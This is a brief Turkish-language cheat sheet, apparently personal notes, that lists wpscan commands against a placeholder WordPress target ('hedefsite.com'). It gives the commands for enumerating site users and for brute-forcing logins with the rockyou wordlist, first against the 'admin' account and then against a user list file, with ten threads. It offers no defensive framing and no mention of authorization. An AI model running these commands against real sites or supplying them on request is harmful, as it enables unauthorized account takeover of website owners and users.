hedef site üzerinde kullanıcı bulma
```bash
wpscan --url http://hedefsite.com -e u
```
```bash
/ bunları siledebiliriz boşluk bırakıyor onlar !!!
```

Brute Force Şifre Denemesi
```bash
wpscan --url http://hedefsite.com \
--passwords /usr/share/wordlists/rockyou.txt \
--usernames admin \
--max-threads 10

```
 Ekstra: Kullanıcı Listesi ile Brute Force

```bash
wpscan --url http://hedefsite.com \
--passwords /usr/share/wordlists/rockyou.txt \
--usernames users.txt \
--max-threads 10

```

